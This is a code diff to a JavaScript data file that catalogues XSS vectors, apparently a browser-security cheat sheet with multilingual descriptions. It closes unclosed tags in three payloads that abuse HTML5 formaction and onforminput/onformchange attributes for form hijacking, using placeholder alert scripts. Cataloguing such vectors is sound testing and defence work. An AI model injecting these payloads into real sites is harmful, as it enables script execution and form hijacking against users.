@@ -13,7 +13,7 @@ var items =
             'tr' : 'formaction ile XSS - kullanıcı etkileşimi gerektiren (1)',
             'zh' : '通过formaction属性进行XSS - 需要用户进行交互 (1)'
         },
-        'data'       : '<form id="test" /><button form="test" formaction="%js_uri_alert%">X',
+        'data'       : '<form id="test"></form><button form="test" formaction="%js_uri_alert%">X</button>',
         'description': {
             'en' : 'A vector displaying the HTML5 form and formaction capabilities for form hijacking outside the actual form.',
             'ja' : 'HTML5\u306eform\u3068formaction\u6a5f\u80fd\u3092\u4f7f\u3063\u3066\u65e2\u5b58\u306eform\u3092\u5916\u5074\u304b\u3089\u4e57\u3063\u53d6\u308b\u624b\u6cd5',
@@ -869,7 +869,7 @@ var items =
             'de' : '',
             'tr' : 'onformchange, onforminput ve form özellikleri ile form gözetimi'
         },
-        'data'       : '<form id=test onforminput=%js_alert%><input></form><button form=test onformchange=%js_alert_2%>X',
+        'data'       : '<form id=test onforminput=%js_alert%><input></form><button form=test onformchange=%js_alert_2%>X</button>',
         'description': {
             'en' : 'Enter a value into the form element to see how "onforminput" and "onformchange" attributes can monitor <FORM> activity - even from outside the <FORM> via the form attribute on a <BUTTON> element.',
             'ja' : '',
@@ -2556,7 +2556,7 @@ var items =
             'cs' : 'XSS použitím formaction - vyžaduje uživatelskou interakci (2)',
             'de' : ''
         },
-        'data'       : '<form><button formaction="%js_uri_alert%">X',
+        'data'       : '<form><button formaction="%js_uri_alert%">X</button>',
         'description': {
             'en' : 'A vector displaying the HTML5 "formaction" capabilities for form hijacking. Note that this variation does not use the "id" and "form" attributes to connect button and form.',
             'ja' : '',
